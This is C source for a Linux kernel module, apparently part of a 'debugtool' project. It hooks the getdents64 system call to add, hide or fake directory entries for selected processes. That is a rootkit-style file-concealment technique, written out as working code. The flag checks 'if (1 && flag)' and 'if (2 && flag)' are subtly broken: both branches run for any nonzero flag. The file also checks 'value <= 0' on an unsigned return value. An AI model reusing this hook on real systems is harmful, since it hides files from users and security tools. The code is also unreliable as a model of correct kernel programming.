
#include <linux/types.h>
#include <linux/linkage.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <stdbool.h>
#include "../../utils/hook_systable.h"
#include "../../utils/kmem.h"
#include "../../utils/kmemmanager.h"
#include "../../exedebugtool/main.h"
#include "../filter_process.h"
#include "./cmd_getdents64.h"
#include "../echo_process/cmd_echo_process.h"
#include "../static_var/static_dents.h"

#define MODULE_TAG "debugtool:getdents64"

extern atomic_t runhook_count;

asmlinkage unsigned long (*raw_getdents64)(struct pt_regs *param);


unsigned long set_static_dents(unsigned long ret, char *dir, char __user *user_buffer, unsigned int user_count)
{
    size_t count[[gnu::unused]];

    if (user_count < sizeof(rootdir)) {
        printk(KERN_ALERT "[%s] user_count is smaller. dents:%s\n", MODULE_TAG, dir);
        return ret;
    }

    for (int i = 0; i < sizeof(fake_dents) / sizeof(struct fake_dent); i++) {
        if (NULL == fake_dents[i].dir) {
            return ret;
        }
        if (0 == strcmp(dir, fake_dents[i].dir)) {
            count = copy_to_user(user_buffer, fake_dents[i].dents, fake_dents[i].count);
            return fake_dents[i].count;
        }
    }

    return ret;
}

asmlinkage unsigned long new_getdents64_func(struct pt_regs *param)
{
    int flag;
    char tmp[0x10];
    struct file *f = NULL;
    char *dir, *pathname = NULL;
    CRITICAL_COUNT_INHOOK

    int dfd = (int)param->regs[0];
    char __user *user_buffer = (char __user *)param->regs[1];
    unsigned int user_count = (unsigned int)param->regs[2];
    unsigned long value = raw_getdents64(param);
    if (value <= 0) {
        return value;
    }

    if (false == filter_process()) {
        return value;
    }

    if (false == filter_thread()) {
        return value;
    }

    f = fget(dfd);
    if (NULL == f) {
        snprintf(tmp, sizeof(tmp), "dfd:%d", dfd);
        echo_process(MODULE_TAG, tmp);
        return value;
    }

    pathname = dt_kmalloc_fast_path();
    if (NULL == pathname) {
        if (f) {fput(f);}
        return value;
    }
    dir = file_path(f, pathname, dt_get_kmalloc_fast_size());
    if (IS_ERR_OR_NULL(dir)) {
        printk(KERN_ALERT "[%s] new_getdents64 file_path error.\n", MODULE_TAG);
        dt_kfree_fast_path(pathname);
        if (f) {fput(f);}
        return value;
    }

    echo_process(MODULE_TAG, dir);

    flag = getdents64_get_flag(dir);

    if (1 && flag) {
        value = getdents64_add_file(dir, user_buffer, value, user_count);
    }
    if (2 && flag) {
        value = getdents64_hide_file(dir, user_buffer, value, user_count);
    }

    value = set_static_dents(value, dir, user_buffer, user_count);

    dt_kfree_fast_path(pathname);
    if (f) {fput(f);}
    return value;
}

bool init_getdents64()
{
    init_getdents64_filter_list();
    if (0 != hook_syscall(__NR_getdents64, (ptr_t)new_getdents64_func,
                          (ptr_t *)&raw_getdents64)) {
        printk(KERN_ALERT "[%s] hook getdents64 error.\n", MODULE_TAG);
        return false;
    }
    return true;
}

bool release_getdents64()
{
    unhook_syscall(__NR_getdents64, raw_getdents64);
    clean_getdents64_filter_list();
    return true;
}

int open_getdents64()
{
    return 0;
}

int close_getdents64()
{
    return 0;
}

int cmd_getdents64(unsigned long arg)
{
    operate_getdents64_cmd(arg);
    return 0;
}
